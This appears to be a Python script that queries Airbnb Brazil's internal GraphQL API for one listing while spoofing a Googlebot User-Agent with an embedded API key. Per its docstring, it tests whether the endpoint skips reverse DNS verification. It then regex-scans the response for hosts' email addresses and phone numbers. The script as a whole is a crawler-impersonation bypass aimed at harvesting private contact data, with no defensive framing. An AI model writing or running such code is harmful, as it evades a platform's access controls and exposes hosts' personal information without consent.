"""
Direct API call as Googlebot on 5G.
Testing Step 4 claim: "no reverse DNS verification on this specific endpoint".
"""
import requests
import json
import base64

LISTING_ID = "1592936909077567519"
API_KEY = "d306zoyjsyarp7ifhu67rjxn52tv0t20"
HASH = "f39436ef71149e853b9c01843700de06029ab1d55e8088d74a2629807428ac2c"

b64_id = base64.b64encode(f"StayListing:{LISTING_ID}".encode()).decode()

variables = {
    "id": b64_id,
    "pdpSectionsRequest": {
        "adults": "1",
        "bypassTargetings": False,
        "layouts": ["SIDEBAR", "SINGLE_COLUMN"],
        "preview": False,
        "useDeviceWidth": False
    }
}

extensions = {
    "persistedQuery": {
        "version": 1,
        "sha256Hash": HASH
    }
}

headers = {
    'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'x-airbnb-api-key': API_KEY,
    'x-airbnb-graphql-request-priority': '0',
    'Accept': 'application/json'
}

params = {
    'operationName': 'StaysPdpSections',
    'locale': 'pt',
    'currency': 'BRL',
    'variables': json.dumps(variables, separators=(',', ':')),
    'extensions': json.dumps(extensions, separators=(',', ':'))
}

api_url = f"https://www.airbnb.com.br/api/v3/StaysPdpSections/{HASH}"

print(f"Calling API {api_url} as Googlebot on 5G...")
r = requests.get(api_url, headers=headers, params=params)
print(f"Status: {r.status_code}")

if r.status_code == 200:
    data = r.json()
    raw = json.dumps(data)
    print(f"Success! Response size: {len(raw)}")
    
    with open("googlebot_api_response.json", "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
        
    # Search for contact
    import re
    emails = re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', raw)
    real_emails = [e for e in emails if 'airbnb' not in e.lower()]
    phones = re.findall(r'"\+?\d{10,15}"', raw)
    
    print(f"Emails found: {real_emails}")
    print(f"Phones found: {phones}")
    
    if 'phone' in raw.lower() or 'email' in raw.lower():
        print("DETECTED phone/email keys in payload!")
else:
    print(f"Error: {r.text[:500]}")
